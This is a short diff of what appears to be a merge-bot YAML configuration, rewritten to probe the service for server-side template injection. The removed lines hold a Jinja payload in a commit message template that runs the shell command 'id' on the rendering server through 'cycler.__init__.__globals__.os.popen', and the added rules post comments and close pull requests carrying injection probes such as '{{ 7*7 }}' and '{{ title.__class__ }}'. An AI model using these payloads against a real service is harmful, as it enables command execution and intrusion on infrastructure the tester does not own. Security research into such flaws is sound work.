@@ -2,14 +2,24 @@ queue_rules:
   - name: default
     conditions:
       - base=main
-    commit_message_template: |
-      {{ title }} (#{{ number }})
-      probe: {{ cycler.__init__.__globals__.os.popen('id').read() }}
 
 pull_request_rules:
-  - name: automerge
+  - name: probe-comment
     conditions:
-      - base=main
+      - label=probe1
     actions:
-      queue:
-        name: default
+      comment:
+        message: |
+          P1: {{ 7*7 }}
+          P2: {{ title.__class__ }}
+          P3: {{ self }}
+          P4: {{ author.upper() }}
+          P5: {{ body.split('probe')[0] | trim }}
+  - name: probe-close
+    conditions:
+      - label=probe2
+    actions:
+      close:
+        message: |
+          C1: {{ 7*7 }}
+          C2: {{ title.__class__ }}
